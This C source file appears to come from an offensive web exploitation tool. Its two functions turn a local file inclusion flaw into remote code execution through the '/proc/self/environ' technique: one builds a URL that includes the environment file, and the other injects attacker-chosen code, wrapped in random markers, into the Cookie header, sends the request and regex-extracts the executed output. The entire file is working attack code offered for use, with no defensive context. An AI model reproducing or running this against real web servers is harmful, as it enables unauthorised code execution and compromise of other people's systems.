#include "techniques/environ.h"
#include "request/request.h"
#include "regex/pcre.h"
#include "string/concat.h"
#include "string/url.h"
#include "string/utils.h"
#include "globals.h"
#include "output.h"

char *proc_env_url(url_t *url, const char *envfile, const char *code, int pos)
{
	char *target = buildurl(url, string_replace, envfile, pos);
	char *res = proc_env_rce(target, code);

	free(target);
	return res;
}

char *proc_env_rce(const char *target, const char *code)
{
	char **matches, mark[8], regex[7 * 2 + 5], *payload, *res = NULL;

	request_t req;
	int len = -1;

	randomstr(mark, sizeof(mark));
	concatlb(regex, mark, "(.*)", mark, NULL);

	char *inject = concatl(mark, code, mark, NULL);

	if (global.cookies) {
		payload = concatl(inject, "; ", global.cookies, NULL);
		free(inject);
	} else {
		payload = inject;
	}


	request_init(&req);

	curl_easy_setopt(req.ch, CURLOPT_URL, target);
	curl_easy_setopt(req.ch, CURLOPT_COOKIE, payload);

	free(payload);

	if (request_exec(&req)) {
		goto end;
	}

	matches = regex_extract(&len, regex, req.body.ptr, req.body.len, PCRE_DOTALL);
	if (len > 0) {
		res = xstrdup(matches[0]);
		regex_free(matches, len);
	}

end:
	request_free(&req);
	return res;
}
